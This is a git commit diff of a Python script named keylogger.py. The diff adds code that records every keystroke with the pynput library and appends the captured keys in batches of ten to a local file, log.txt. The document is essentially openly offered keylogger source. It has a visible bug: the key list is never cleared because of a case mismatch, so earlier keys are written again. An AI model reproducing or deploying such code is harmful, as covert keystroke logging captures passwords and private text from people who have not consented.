f3677c176e9ce64eaf7c039d95d697c5e43f1276
boss10801 <boss101801@gmail.com>
2023-12-29 14:48:46 +0700

    Create fileable

--- keylogger.py
+++ keylogger.py
@@ -1,18 +1,38 @@
 #Install pynput
+import os
 from pynput.keyboard import Key, Listener
+
+count = 0
+keyList = []
 
 # Reference https://pypi.org/project/pynput/
 def on_press(key):
+    global keyList, count
     try:
         print('alphanumeric key {0} pressed'.format(key.char))
     except AttributeError:
         print('special key {0} pressed'.format(key))
 
+    keyList.append(key)
+    count += 1
+
+    #Every 10 character will put into the file
+    if count >= 10:
+        count = 0
+        writeFile(keyList)
+        keylist = []
+
+
 def on_release(key):
-    print('{0} released'.format(key))
     if key == Key.esc:
         # Stop listener
         return False
+
+def writeFile(keyList):
+    with open("log.txt", "a" if os.path.exists("log.txt") else "w") as logfile:
+        for key in keyList:
+            logfile.write(str(key))
+
 
 with Listener(on_press = on_press ,on_release = on_release) as listener:
     listener.join()
